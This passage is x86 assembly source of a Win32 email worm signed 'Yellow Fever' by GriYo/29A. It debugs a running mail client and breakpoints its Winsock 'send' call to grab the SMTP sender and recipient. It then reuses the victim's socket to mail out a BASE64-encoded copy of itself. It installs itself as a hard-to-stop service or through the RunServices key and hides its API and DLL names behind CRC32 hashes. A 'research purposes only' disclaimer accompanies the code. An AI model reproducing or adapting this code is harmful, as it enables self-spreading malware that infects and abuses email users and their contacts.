                call dword ptr [a_SetThreadContext]

ExitSingleStep:         jmp ContinueDebug

;························································································································································

DoBreakPoint:           ;First chance?

                cmp dword ptr [esi+DEBUG_EVENT__EXCEPTION.DEE_dwFirstChance],00000000h

                je AvoidUnhandledException

                ;Over our hook?

                mov edi,dword ptr [esi+DEBUG_EVENT__EXCEPTION.DEE_ExceptionRecord.ER_ExceptionAddress]

                cmp edi,dword ptr [a_send]
                jne AvoidUnhandledException

                ;Get thread handle from current thread id
                ;on target process

                mov edx,dword ptr [DebugEventInfo+00000008h]

                call GetThreadHandleFromThreadId
                or eax,eax
                jz AvoidUnhandledException

                mov esi,eax

                call PrepareContext

                push edi
                push esi
                call dword ptr [a_GetThreadContext]

                or eax,eax
                jz AvoidUnhandledException

                ;Go!

                jmp Manipulate__send

AvoidUnhandledException:    ;Exception has been handled

                jmp ContinueDebug

;························································································································································
;Manipulate *send*
;
;On entry:  esi -> Thread handle
;       edi -> Context for process being debugged
;························································································································································

Manipulate__send:       push esi
                push edi

                call GetSendCallerBuffer
                jecxz exit_Manipulate__send

                mov edi,esi
                push ecx
                push esi
                mov ecx,00000004h               
                call GetCRC32
                pop esi
                pop ecx

                cmp edx,0d15ec8bch
                je WorkWith__MAIL_FROM

                cmp edx,6a304c39h
                je WorkWith__RCPT_TO

                cmp edx,3ddcb44eh
                je WorkWith__DOT

exit_Manipulate__send:      pop edi
                pop esi

                ;Move EIP back to the INT 03h instruction
                ;and set the single step flag

                dec dword ptr [edi+CONTEXT.CONTEXT_Eip]

                or dword ptr [edi+CONTEXT.CONTEXT_EFlags],SINGLE_STEP

                push edi
                push esi
                call dword ptr [a_SetThreadContext]

                ;Remove our breakpoint

                mov edi,dword ptr [a_send]
                lea esi,dword ptr [Org1Byte__send]

                ;esi <- Ptr to original 1st byte of API code
                ;edi <- Address of API entry-point

                call RemoveBreakPoint

                jmp AvoidUnhandledException

;························································································································································
;WorkWith__MAIL_FROM
;························································································································································

WorkWith__MAIL_FROM:        cmp dword ptr [TargetStatus],00000000h
                jne exit_Manipulate__send
                
                inc dword ptr [TargetStatus]

                mov dword ptr [SizeOf__MAIL_FROM],ecx

                mov edi,offset e__MAIL_FROM

                cld
                rep movsb

                jmp exit_Manipulate__send

;························································································································································
;WorkWith__RCPT_TO
;························································································································································

WorkWith__RCPT_TO:      cmp dword ptr [TargetStatus],00000001h
                jne exit_Manipulate__send

                inc dword ptr [TargetStatus]

                mov dword ptr [SizeOf__RCPT_TO],ecx

                mov edi,offset e__RCPT_TO

                cld
                rep movsb

                jmp exit_Manipulate__send

;························································································································································
;WorkWith__DOT
;························································································································································

DUPLICATE_SAME_ACCESS       equ 00000002h

SIZEOF_BLOCK_DIVIDER        equ 8192

WorkWith__DOT:          cmp dword ptr [TargetStatus],00000002h
                jne ExitWorkWith__DOT

                ;Duplicate socket handle

                push DUPLICATE_SAME_ACCESS          ;dwOptions
                push 00000001h                  ;bInheritHandle
                push 00000000h                  ;dwDesiredAccess
                push offset hDupSocket              ;lpTargetHandle
                call dword ptr [a_GetCurrentProcess]
                push eax                    ;hTargetProcessHandle
                push dword ptr [Buffer_send_Params+00000004h]   ;hSourceHandle
                push dword ptr [hTargetProcess]         ;hSourceProcessHandle
                call dword ptr [a_DuplicateHandle]
                or eax,eax
                jz ExitWorkWith__DOT

                ;Send .

                push 00000000h                  ;Flags
                push SizeOf__DOT                ;Size
                push offset e__DOT              ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                cmp eax,SizeOf__DOT
                jne CloseDupHandle

                call RecvSmtpReply
                or eax,eax
                jz CloseDupHandle

                ;Send MAIL FROM

                push 00000000h                  ;Flags
                push dword ptr [SizeOf__MAIL_FROM]      ;Size
                push offset e__MAIL_FROM            ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                cmp eax,dword ptr [SizeOf__MAIL_FROM]
                jne CloseDupHandle

                call RecvSmtpReply
                or eax,eax
                jz CloseDupHandle

                ;Send RCPT TO

                push 00000000h                  ;Flags
                push dword ptr [SizeOf__RCPT_TO]        ;Size
                push offset e__RCPT_TO              ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                cmp eax,dword ptr [SizeOf__RCPT_TO]
                jne CloseDupHandle

                call RecvSmtpReply
                or eax,eax
                jz CloseDupHandle

                ;Send DATA

                push 00000000h                  ;Flags
                push SizeOf__DATA               ;Size
                push offset e__DATA             ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                cmp eax,SizeOf__DATA
                jne CloseDupHandle
                
                call RecvSmtpReply
                or eax,eax
                jz CloseDupHandle

                ;Send FROM:

                push 00000000h                  ;Flags
                mov eax,dword ptr [SizeOf__MAIL_FROM]
                sub eax,00000005h
                push eax                    ;Size
                push offset e__MAIL_FROM+00000005h      ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                ;Send TO:

                push 00000000h                  ;Flags
                mov eax,dword ptr [SizeOf__RCPT_TO]
                sub eax,00000005h
                push eax                    ;Size
                push offset e__RCPT_TO+00000005h        ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                ;Send message body

                push 00000000h                  ;Flags
                push SizeOf__BODY               ;Size
                push offset e__BODY             ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

                ;Send BASE64 encoded virus

                push 00000000h                  ;Flags
                push SIZEOF_VIRUS_BASE64            ;Size
                push dword ptr [BASE64__encoded]        ;Buffer
                push dword ptr [hDupSocket]             ;Socket
                call dword ptr [a_send]

CloseDupHandle:         push dword ptr [hDupSocket]
                call dword ptr [a_CloseHandle]

                mov dword ptr [TargetStatus],00000000h
                
ExitWorkWith__DOT:      jmp exit_Manipulate__send       

;························································································································································
;RecvSmtpReply
;························································································································································

RecvSmtpReply:          mov dword ptr [Buffer_rcv],00000000h

                push offset FIONREAD_param
                push 4004667Fh
                push dword ptr [hDupSocket]
                call dword ptr [a_ioctlsocket]

                cmp dword ptr [FIONREAD_param],00000000h
                je RecvSmtpReply

                push 00000000h              ;Flags
                push dword ptr [FIONREAD_param]     ;Size
                push offset Buffer_rcv          ;Buffer
                push dword ptr [hDupSocket]     ;Socket

                call dword ptr [a_recv]

NoMoreData2Read:        mov eax,dword ptr [Buffer_rcv]
                cmp eax,' 453'
                je RecvOk
                cmp eax,' 052'
                je RecvOk
RecvError:
                xor eax,eax

RecvOk:             ret

;························································································································································
;Read parameters used by the caller and use them to capture its data buffer
;This data buffer may contain SMTP commands as well as the mail message
;
;On entry:  edi -> Context for process being debugged
;
;On exit:   ecx -> Size of buffer or 00000000h on error
;       esi -> Ptr to a copy of callers buffer (ManipulateBuffer)
;························································································································································

GetSendCallerBuffer:        ;Get calling parameters

                mov eax,dword ptr [edi+CONTEXT.CONTEXT_Esp]
                mov ecx,SIZEOF_SEND_PARAMS
                mov esi,offset Buffer_send_Params
                call VirusReadProcessMemory
                or eax,eax
                jz ErrorGetCallerBuffer

                ;Buffer is too big or invalid?

                mov ecx,dword ptr [esi+0000000Ch]
                jecxz ErrorGetCallerBuffer

                cmp ecx,SIZEOF_MANIPULATE_BUFFER
                jae ErrorGetCallerBuffer

                mov eax,dword ptr [esi+00000008h]
                mov esi,offset ManipulateBuffer
                call VirusReadProcessMemory
                or eax,eax
                jz ErrorGetCallerBuffer

                ret

ErrorGetCallerBuffer:       xor ecx,ecx
                ret

;························································································································································
;BASE64encode
;
;On entry:  esi <- Buffer with data to encode
;       edi <- Destination buffer
;························································································································································


BASE64encode:           xor ecx,ecx
                mov dword ptr [BASE64__lines],ecx

                cld

BASE64encode_loop:      cmp ecx,SIZEOF_VIRUS
                jae BASE64__exit

                xor edx,edx
                mov dh,byte ptr [esi+ecx]
                inc ecx

                cmp ecx,SIZEOF_VIRUS
                jae BASE64__00

                mov dl,byte ptr [esi+ecx]

BASE64__00:         inc ecx
                shl edx,08h

                cmp ecx,SIZEOF_VIRUS
                jae BASE64__01

                mov dl,byte ptr [esi+ecx]

BASE64__01:         inc ecx

                mov eax,edx
                and eax,00fc0000h
                shr eax,12h
                mov al,byte ptr [eax+offset Base64DecodeTable]
                stosb

                mov eax,edx
                and eax,0003f000h
                shr eax,0Ch
                mov al,byte ptr [eax+offset Base64DecodeTable]
                stosb

                mov eax,edx
                and eax,00000fc0h
                shr eax,06h
                mov al,byte ptr [eax+offset Base64DecodeTable]
                stosb

                mov eax,edx
                and eax,0000003fh
                mov al,byte ptr [eax+offset Base64DecodeTable]
                stosb

                cmp ecx,SIZEOF_VIRUS
                jbe BASE64__02

                mov byte ptr [edi-00000001h],'='

BASE64__02:         cmp ecx,SIZEOF_VIRUS+01h
                jbe BASE64__03

                mov byte ptr [edi-00000002h],'='

                inc dword ptr [BASE64__lines]

                cmp dword ptr [BASE64__lines],00000013h
                jne BASE64encode_loop

                mov ax,0A0Dh
                stosw

                mov dword ptr [BASE64__lines],00000000h

BASE64__03:         jmp BASE64encode_loop

BASE64__exit:           mov ax,0A0Dh
                stosw
                
                ret

;························································································································································
;Prepare thread context structure
;
;On entry:
;
;On exit:   edi -> Ptr to thread context structure
;························································································································································

PrepareContext:         mov edi,offset ThreadContext
                push edi
                mov ecx,SizeOfContext
                xor eax,eax
                cld
                rep stosb
                pop edi
                mov dword ptr [edi+CONTEXT.CONTEXT_ContextFlags],CONTEXT_CONTROL
                ret

;························································································································································
;Window enumeration procedure
;························································································································································

EnumWndProc:            mov eax,dword ptr [esp+00000004h]

                push ebx
                push esi
                push edi
                push ebp

                mov edi,eax

                push 00000040h
                mov esi,offset ClassName
                push esi
                push eax
                call dword ptr [a_GetClassNameA]
                or eax,eax
                jz WindowNotFound
                                
                call GetStringCRC32
                cmp edx,0cfa7a89h
                jne WindowNotFound

                mov eax,offset TargetProcessID
                push eax
                push edi
                call dword ptr [a_GetWindowThreadProcessId]
                
                mov dword ptr [TargetThreadID],eax

                xor eax,eax

GotTheTrue:         pop ebp
                pop edi
                pop esi
                pop ebx

                ret

WindowNotFound:         mov eax,00000001h
                jmp short GotTheTrue

;························································································································································
;HookApiProvider
;························································································································································

DEBUG_EVENT__LOAD_DLL       struc

dwProcessId         dd ?
dwThreadId          dd ?
  
hFile               dd ?
lpBaseOfDll         dd ?
dwDebugInfoFileOffset       dd ?
nDebugInfoSize          dd ?
lpImageName         dd ?
fUnicode            dw ?

DEBUG_EVENT__LOAD_DLL       ends

;························································································································································

HookApiProvider:        cld
                lodsd ;dwProcessId

                cmp eax,dword ptr [TargetProcessID]
                jne NoHookOnThisDLL

                lodsd ;dwThreadId
                mov edx,eax

                lodsd ;hFile
                lodsd ;lpBaseOfDll

                mov ebx,eax

                ;Avoid relocated dlls

                cmp ebx,dword ptr [hWSOCK32]
                jne NoHookOnThisDLL

                lea eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                mov ecx,00000004h
                mov esi,offset Buffer__lfanew
                call VirusReadProcessMemory
                or eax,eax
                jz NoHookOnThisDLL
                
                lodsd
                or eax,eax
                jz NoHookOnThisDLL

                add eax,ebx
                mov ecx,IMAGE_SIZEOF_FILE_HEADER
                mov esi,offset Buffer__FileHeader
                call VirusReadProcessMemory
                or eax,eax
                jz NoHookOnThisDLL

                mov ecx,IMAGE_SIZEOF_FILE_HEADER
                call GetCRC32

                cmp dword ptr [CRC__Winsock],edx
                jne NoHookOnThisDLL

                ; EBX -> WSOCK32 base address into
                ;    address space of target process

                ;Patch send ( WSOCK32 API)

                mov eax,dword ptr [a_send]
                mov esi,offset Org1Byte__send
                call Save1stBytesOfAPI
                or eax,eax
                jz NoHookOnThisDLL

                mov edi,dword ptr [a_send]
                call SetBreakPointOnAPI

NoHookOnThisDLL:        ret

;························································································································································
;Save 1st byte of API
;
;On entry:  eax <- Address of API entry-point
;       esi <- Buffer for the read byte
;························································································································································

Save1stBytesOfAPI:      mov ecx,SizeOfBreakpointAndRet04
                call VirusReadProcessMemory
                lodsd
                ret

;························································································································································
;Set break-point on API
;
;On entry:  edi <- Address of API entry-point
;························································································································································

SetBreakPointOnAPI:     push esi
                mov eax,dword ptr [hTargetProcess]
                mov esi,offset opcodeINT03
                mov ecx,SizeOfBreakpointAndRet04
                call VirusWriteProcessMemory
                pop esi
                ret

;························································································································································
;Remove break-point
;
;On entry:  esi <- Ptr to original 1st byte of API code
;       edi <- Address of API entry-point
;························································································································································

RemoveBreakPoint:       mov eax,dword ptr [hTargetProcess]          
                mov ecx,SizeOfBreakpointAndRet04
                call VirusWriteProcessMemory
                ret

;························································································································································
;VirusReadProcessMemory
;
;On entry:  eax -> Pointer to the base address from which to read
;       ecx -> Specifies the requested number of bytes to read
;       esi -> Pointer to a buffer that receives the contents from 
;              the address
;
;On exit:   eax -> NULL if error
;
;       ebx, ecx, esi, edi, ebp preserved
;························································································································································

VirusReadProcessMemory:     push edi
                push ecx

                mov edi,offset RPM_BytesRead
                push edi
                push ecx
                push esi
                push eax
                push dword ptr [hTargetProcess]

                call dword ptr [a_ReadProcessMemory]

                pop ecx

                or eax,eax
                jz ExitREM

                cmp dword ptr [edi],ecx
                je ExitREM

                xor eax,eax

ExitREM:            pop edi
                cld
                ret

;························································································································································
;VirusWriteProcessMemory
;
;On entry:  eax <- Process handle
;       esi <- Ptr to source
;       edi <- Ptr to destination
;       ecx <- Size
;
;On exit:   eax -> NULL on error
;························································································································································

VirusWriteProcessMemory:    push eax
                push ecx
                
                mov edx,offset WPM_BytesWritten
                push edx
                push ecx
                push esi
                push edi
                push eax
                call dword ptr [a_WriteProcessMemory]

                pop ecx
                pop edx

                or eax,eax
                jz VWPMFailed

                xor eax,eax
                cmp dword ptr [WPM_BytesWritten],ecx
                jne VWPMFailed

                push 00000000h
                push 00000000h
                push edx
                call dword ptr [a_FlushInstructionCache]
VWPMFailed:         ret

;························································································································································
;VirusGetSystemInfo
;
;On entry:  None
;
;On exit:   eax -> NULL on error
;························································································································································

VirusGetSystemInfo:     mov esi,offset system_version
                push esi
                mov dword ptr [esi],00000094h
                call dword ptr [a_GetVersionExA]
                or eax,eax
                jz VirusGetSysInfoError

                push MAX_PATH
                mov esi,offset Path_VirusCurrentFile
                push esi
                push 00000000h
                call dword ptr [a_GetModuleFileNameA]
                or eax,eax
                jz VirusGetSysInfoError
                        
                mov edi,offset SizeOfComputerName
                push edi
                mov eax,00000020h
                cld
                stosd
                push edi
                call dword ptr [a_GetComputerNameA]
                or eax,eax
                jz VirusGetSysInfoError

                push MAX_PATH
                mov esi,offset Path_SearchSystemDLL
                push esi
                call dword ptr [a_GetSystemDirectoryA]
                or eax,eax
                jz VirusGetSysInfoError

                mov edi,esi
                add edi,eax
                cld
                mov eax,'D.*\'
                stosd
                mov eax,00004C4Ch
                stosd

                mov edi,offset Path_VirusSystemFile
                call StringParser

                push edx ;*

                mov edi,edx

                mov esi,offset szComputerName
                call GetStringCRC32

                mov eax,00000004h
                call GetRangeRND

                mov ecx,eax
                and ecx,00000003h
                inc ecx

LoopBuildNick:          mov al,dl
                and al,0Fh
                add al,'a'
                stosb
                shr edx,04h     
                loop LoopBuildNick

                mov eax,452E3233h
                stosd
                mov eax,00004558h
                stosd

                pop esi ;*

                mov edi,offset ViralServiceName
MakeViralServiceName:       lodsb
                cmp al,2Eh
                je DoneViralServiceName
                stosb
                jmp MakeViralServiceName

DoneViralServiceName:       xor al,al
                stosb

VirusGetSysInfoError:       ret

;························································································································································
;Load DLLs and locate functions
;
;On exit:   eax -> NULL on error
;························································································································································

LoadDllsAndLocateFunctions: xor eax,eax
                mov dword ptr [hADVAPI32],eax
                mov dword ptr [hUSER32],eax
                mov dword ptr [hWSOCK32],eax

                ;USER32

                mov eax,dword ptr [CrcUSER32]
                mov ecx,NumUSER32
                mov esi,offset CrcApisUSER32
                mov edi,offset EpApisUSER32
                call VirLoadLib
                mov dword ptr [hUSER32],eax
                or eax,eax
                jz OneDllFailedToLoad

                ;WSOCK32

                mov eax,dword ptr [CrcWSOCK32]
                mov ecx,NumWSOCK32
                mov esi,offset CrcApisWSOCK32
                mov edi,offset EpApisWSOCK32
                call VirLoadLib
                mov dword ptr [hWSOCK32],eax
                or eax,eax
                jz OneDllFailedToLoad

                ;Initialize Windows sockets library by
                ;issuing a call to WSAStartup

                push offset WSAData
                push 00000101h
                call dword ptr [a_WSAStartup]
                or eax,eax
                jnz OneDllFailedToLoad

                ;Version check

                mov eax,dword ptr [system_version+00000010h]

                cmp eax,VER_PLATFORM_WIN32_NT
                jne UseWin9xADVAPI32

                ;Get ADVAPI32 apis for Windows Nt

                mov eax,dword ptr [CrcADVAPI32]
                mov ecx,NumADVAPI32_nt
                mov esi,offset CrcApisADVAPI32_nt
                mov edi,offset EpApisADVAPI32_nt
                call VirLoadLib             
                mov dword ptr [hADVAPI32],eax

                ret

UseWin9xADVAPI32:       cmp eax,VER_PLATFORM_WIN32_WINDOWS
                jne OneDllFailedToLoad

                ;Get ADVAPI32 apis for Windows 9x

                mov eax,dword ptr [CrcADVAPI32]
                mov ecx,NumADVAPI32_w9x
                mov esi,offset CrcApisADVAPI32_w9x
                mov edi,offset EpApisADVAPI32_w9x
                call VirLoadLib             
                mov dword ptr [hADVAPI32],eax

                ret

OneDllFailedToLoad:     xor eax,eax
                ret

;························································································································································
;Unload DLLs
;························································································································································

UnloadDlls:         mov eax,dword ptr [hWSOCK32]
                or eax,eax
                jz DoneWith_WSOCK32

                call dword ptr [a_WSACleanup]

                push eax
                call dword ptr [a_FreeLibrary]

DoneWith_WSOCK32:       mov eax,dword ptr [hUSER32]
                or eax,eax
                jz DoneWith_USER32

                push eax
                call dword ptr [a_FreeLibrary]
                
DoneWith_USER32:        mov eax,dword ptr [hADVAPI32]
                or eax,eax
                jz DoneWith_ADVAPI32

                push eax
                call dword ptr [a_FreeLibrary]

DoneWith_ADVAPI32:      ret

;························································································································································
;Make crc lookup table
;
;Generate a table for a byte-wise 32-bit CRC calculation on the polynomial:
;x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.
;
;Polynomials over GF(2) are represented in binary, one bit per coefficient,
;with the lowest powers in the most significant bit.  Then adding polynomials
;is just exclusive-or, and multiplying a polynomial by x is a right shift by
;one.  If we call the above polynomial p, and represent a byte as the
;polynomial q, also with the lowest power in the most significant bit (so the
;byte 0xb1 is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,
;where a mod b means the remainder after dividing a by b.
;
;This calculation is done using the shift-register method of multiplying and
;taking the remainder.  The register is initialized to zero, and for each
;incoming bit, x^32 is added mod p to the register if the bit is a one (where
;x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod p by
;x (which is shifting right by one and adding x^32 mod p if the bit shifted
;out is a one).  We start with the highest power (least significant bit) of
;q and repeat for all eight bits of q.
;
;The table is simply the CRC of all possible eight bit values.  This is all
;the information needed to generate CRC's on data a byte at a time for all
;combinations of CRC register values and incoming bytes.
;
;Original C code by Mark Adler
;Translated to asm for Win32 by GriYo
;························································································································································

;Make exclusive-or pattern from polynomial (0EDB88320h)
;
;The following commented code is an example of how to
;make the exclusive-or pattern from polynomial at runtime       
;
;               xor edx,edx
;               mov ecx,0000000Eh
;               mov ebx,offset CRC32Terms
;ComputePolynomial:     mov eax,ecx
;               xlatb
;               sub eax,0000001Fh
;               neg eax
;               bts edx,eax
;               loop ComputePolynomial
;
;edx contains now the exclusive-or pattern
;
;The polynomial is:
;
; X^32+X^26+X^23+X^22+X^16+X^12+X^11+X^10+X^8+X^7+X^5+X^4+X^2+X^1+X^0
;
;CRC32Terms db 0,1,2,4,5,7,8,10,11,12,16,22,23,26       

CreateCRC32Table:       cld
                mov ecx,00000100h
                mov edi,offset CRC32LookupTable
CreateCRC32TableLoop:       mov eax,000000FFh
                sub eax,ecx
                push ecx
                mov ecx,00000008h               
CreateCRC32Value:       shr eax,01h
                jnc CreateCRC32NextValue
                xor eax,0EDB88320h
CreateCRC32NextValue:       loop CreateCRC32Value
                pop ecx
                stosd
                loop CreateCRC32TableLoop
                ret

;························································································································································
;Return a 32bit CRC of the contents of the buffer
;
;On entry:  esi -> Ptr to buffer
;       ecx -> Buffer size
;
;On exit:   edx -> 32bit CRC
;························································································································································

GetCRC32:           cld
                push edi
                xor edx,edx
                mov edi,offset CRC32LookupTable
ComputeLoopCRC32:       push ecx
                lodsb
                xor eax,edx
                and eax,000000FFh               
                shr edx,08h
                xor edx,dword ptr [edi+eax]
                pop ecx
                loop ComputeLoopCRC32
                pop edi
                ret

;························································································································································
;Get a 32bit CRC of a null terminated array
;
;On entry:  esi -> Ptr to string
;
;On exit:   edx -> 32bit CRC
;························································································································································

GetStringCRC32:         cld
                push ecx
                push edi
                mov edi,esi
                xor eax,eax
                mov ecx,eax
ComputeStringLoopCRC32:     inc ecx
                scasb
                jnz ComputeStringLoopCRC32
                call GetCRC32
                pop edi
                pop ecx
                ret

;························································································································································
;VirLoadLib
;
;To use CRC32 instead of API names sounds cool... But there are still some
;strings authors cant get rid of... When calling LoadLibrary the virus must
;specify the DLL name
;
;This routine is the solution to avoid the usage of DLL names
;
;On entry:  eax -> CRC32 of DLL name
;               esi -> CRC32 of API names
;               edi -> Where to put API addresses
;               ecx -> Number of APIs to find
;
;On exit:   eax -> Module handle or NULL on error
;························································································································································

VirLoadLib:         push ecx
                        push esi
                push edi

                mov dword ptr [a_SDLL_CRC32],eax

                mov eax,offset Win32FindData
                push eax    
                mov eax,offset Path_SearchSystemDLL
                push eax

                call dword ptr [a_FindFirstFileA]
                cmp eax,INVALID_HANDLE_VALUE
                jz EVirLoadLib

                mov dword ptr [h_Find],eax

CheckDllName:           mov esi,offset Win32FindData.WFD_szFileName
                mov edi,offset StringBuffer
                call StringParser
                mov esi,edx
                call GetStringCRC32

                cmp edx,dword ptr [a_SDLL_CRC32]
                je OkCheckDll

                mov eax,offset Win32FindData
                push eax
                push dword ptr [h_Find]
                call dword ptr [a_FindNextFileA]
                or eax,eax
                        jnz CheckDllName

EVirLoadLib:            pop edi
                pop esi
                        pop ecx
                xor eax,eax
                ret

OkCheckDll:         mov esi,offset Path_SearchSystemDLL
                mov edi,offset StringBuffer

                push edi

                call StringParser
                mov esi,offset Win32FindData.WFD_szFileName
                mov edi,edx
                call StringParser

                call dword ptr [a_LoadLibraryA]
                        or eax,eax
                        jz EVirLoadLib

                        mov ebx,eax

                        pop edi
                pop esi
                        pop ecx

                call get_APIs
                        jecxz OkVirLoadLib

                        push ebx
                        call dword ptr [a_FreeLibrary]
                        xor eax,eax
                        ret

OkVirLoadLib:           mov eax,ebx
                        ret

;························································································································································
;Get the entry-point of each needed API
;
;This routine uses the CRC32 instead of API names
;
;On entry:  ebx -> Base address of DLL
;       ecx -> Number of APIs in the folling buffer
;       esi -> Buffer filled with the CRC32 of each API name
;       edi -> Recives found API addresses
;
;On exit:   ecx -> Is 00000000h if everything was ok
;························································································································································

get_APIs:           cld             
get_each_API:           push ecx
                push esi
                
                mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]

                        mov edx,dword ptr [eax+ebx+NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
                        add edx,ebx
                mov esi,dword ptr [edx+ED_AddressOfNames]
                add esi,ebx
                mov ecx,dword ptr [edx+ED_NumberOfNames]                

API_Loop:           lodsd
                push esi
                lea esi,dword ptr [eax+ebx] 
                push esi
                call GetStringCRC32
                mov esi,dword ptr [esp+00000008h]
                lodsd
                cmp eax,edx
                je CRC_API_found
                pop eax
                pop esi
                loop API_Loop
get_API_error:          pop esi
                pop ecx
                ret

CRC_API_found:          push ebx    
                call GetProcAddress

                cld
                pop edx

                or eax,eax
                jz get_API_error
                
                stosd
                pop esi
                lodsd
                pop ecx             
                loop get_each_API
                ret

;························································································································································
;This routine takes a string pointed by esi and copies
;it into a buffer pointed by edi
;
;The result string will be converted to upper-case
;
;On entry:  esi -> Pointer to source string
;       edi -> Pointer to returned string
;
;On exit:   al  -> Null
;       edx -> Points to character next to last \
;       edi -> Points 1byte above the null terminator
;························································································································································

StringParser:           mov edx,edi
                cld
ScanZstring:            lodsb               
                cmp al,"a"
                jb IsNotLowerCase
                cmp al,"z"
                ja IsNotLowerCase
                and al,0DFh
IsNotLowerCase:         stosb
                cmp al,"\"
                jne NoSlashAtPos
                mov edx,edi
NoSlashAtPos:           or al,al
                jnz ScanZstring
                ret

;························································································································································
;Linear congruent pseudorandom number generator
;
;On entry:  None
;
;On exit:   eax -> Random number
;························································································································································

GetRND:                 push ecx
                        push edx
                        mov eax,dword ptr [SeedRND]
                        mov ecx,41C64E6Dh
                        mul ecx
                        add eax,00003039h
                        and eax,7FFFFFFFh
                        mov dword ptr [SeedRND],eax
                        pop edx
                        pop ecx
                        ret

;························································································································································
;Returns a random number into specified range ( 0 <= n < eax )
;
;On entry:  eax -> Max. range
;
;On exit:   eax -> Random number
;························································································································································

GetRangeRND:            push ecx
                        push edx
                        mov ecx,eax
                        call GetRND
                        xor edx,edx
                        div ecx
                        mov eax,edx  
                        pop edx
                        pop ecx
                        ret

;························································································································································

_TEXT               ends

;########################################################################################################################################################

_DATA               segment dword use32 public 'DATA'

;························································································································································

szKERNEL32DLL           db 'KERNEL32.DLL',00h

;························································································································································

szCommandLine           db '/29A',00h

;························································································································································

szWin9xKeyName          db 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',00h

;························································································································································

Base64DecodeTable       equ $

                db 'A','B','C','D','E','F','G','H','I','J'
                db 'K','L','M','N','O','P','Q','R','S','T'
                db 'U','V','W','X','Y','Z','a','b','c','d'
                db 'e','f','g','h','i','j','k','l','m','n'
                db 'o','p','q','r','s','t','u','v','w','x'
                db 'y','z','0','1','2','3','4','5','6','7'
                db '8','9','+','/'

SizeOfBase64DecodeTable     equ $-Base64DecodeTable

;························································································································································

opcodeINT03         db 0CCh      ;Break-point

;························································································································································

SERVICE_RUNNING         equ 00000004h
SERVICE_ACCEPT_SHUTDOWN     equ 00000004h

ServiceStatusStructure      equ $

dd SERVICE_WIN32_OWN_PROCESS    ;dwServiceType 
dd SERVICE_RUNNING      ;dwCurrentState 
dd SERVICE_ACCEPT_SHUTDOWN  ;dwControlsAccepted 
                ;
                ;Dont allow STOP, only SHUTDOWN
                ;
                ;The service is notified when system shutdown
                ;occurs
                ;
                ;This flag allows the service to receive the
                ;SERVICE_CONTROL_SHUTDOWN value
                ;
                ;Note that ControlService cannot send this
                ;control code, only the system can send
                ;SERVICE_CONTROL_SHUTDOWN
                ;
dd 00000000h            ;dwWin32ExitCode 
dd 00000000h            ;dwServiceSpecificExitCode 
dd 00000000h            ;dwCheckPoint
dd 0FFFFFFFFh           ;dwWaitHint 

;························································································································································

                db '['
                db ' Yellow Fever BioCoded by GriYo / 29A'
                db ' ]'

                db '['
                db ' Disclaimer: This software has been'
                db ' designed for research purposes only.'
                db ' The author is not responsible for any'
                db ' problems caused due to improper or'
                db ' illegal usage of it'
                db ' ]'

;························································································································································

CrcGetProcAddress       dd 0a5e34bc2h
CrcKERNEL32         dd 0f2c501c3h
CrcUSER32           dd 666f8db0h
CrcADVAPI32         dd 0eb9f7b65h
CrcWSOCK32          dd 0be2cf7dah

;························································································································································

CrcApisKERNEL32         equ $

CRC__CloseHandle        dd 0b87a006fh
CRC__ContinueDebugEvent     dd 027e3a9bh
CRC__CopyFileA          dd 3dd13a04h
CRC__CreateFileA        dd 7ed7136ah
CRC__CreateFileMappingA     dd 0d094d7c4h
CRC__CreateProcessA     dd 0307d6f2h
CRC__CreateThread       dd 0d15770bah
CRC__DebugActiveProcess     dd 0b00173d4h
CRC__DuplicateHandle        dd 0d42bfe3bh
CRC__ExitProcess        dd 0f2205a14h
CRC__ExitThread         dd 60479e16h
CRC__FindClose          dd 0ac76f1beh
CRC__FindFirstFileA     dd 0cfbc4377h
CRC__FindNextFileA      dd 99306305h
CRC__FlushInstructionCache  dd 9e14a5bch
CRC__FreeLibrary        dd 0acf0d283h
CRC__GetCommandLineA        dd 2ca614d3h
CRC__GetComputerNameA       dd 3bd1499ah
CRC__GetCurrentProcess      dd 64ddd496h
CRC__GetCurrentProcessId    dd 84120each
CRC__GetModuleFileNameA     dd 0b82d2052h
CRC__GetSystemDirectoryA    dd 286e0808h
CRC__GetThreadContext       dd 0d896c904h
CRC__GetVersionExA      dd 0b1c4fe5ah
CRC__LoadLibraryA       dd 0c9f5452dh
CRC__MapViewOfFile      dd 75706cffh
CRC__ReadProcessMemory      dd 0dc4557b7h
CRC__SetThreadContext       dd 0ab04c022h
CRC__Sleep          dd 076cf6efh
CRC__UnmapViewOfFile        dd 07d68ea4h
CRC__VirtualAlloc       dd 0f31cc1d2h
CRC__VirtualFree        dd 11e89c50h
CRC__WaitForDebugEvent      dd 0e378a217h
CRC__WaitForSingleObject    dd 97580987h
CRC__WriteFile          dd 0b099498h
CRC__WriteProcessMemory     dd 0b2e10e52h

CRC__RegisterServiceProcess dd 0d9cd1eeah

;························································································································································

CrcApisUSER32           equ $

CRC__EnumWindows        dd 65ac280ch
CRC__GetClassNameA      dd 5e305eb5h
CRC__GetWindowThreadProcessId   dd 0b8e54692h

;························································································································································

CrcApisADVAPI32_nt      equ $

CRC__CloseServiceHandle      dd 7745e0f1h
CRC__CreateServiceA      dd 001d5e71h
CRC__OpenSCManagerA      dd 0b4a565dch
CRC__OpenServiceA        dd 0b103fc09h
CRC__RegisterServiceCtrlHandlerA dd 0b210319eh
CRC__SetServiceStatus        dd 0f5c019c2h
CRC__StartServiceA       dd 09b8536ah
CRC__StartServiceCtrlDispatcherA dd 9e784a71h

;························································································································································

CrcApisADVAPI32_w9x     equ $

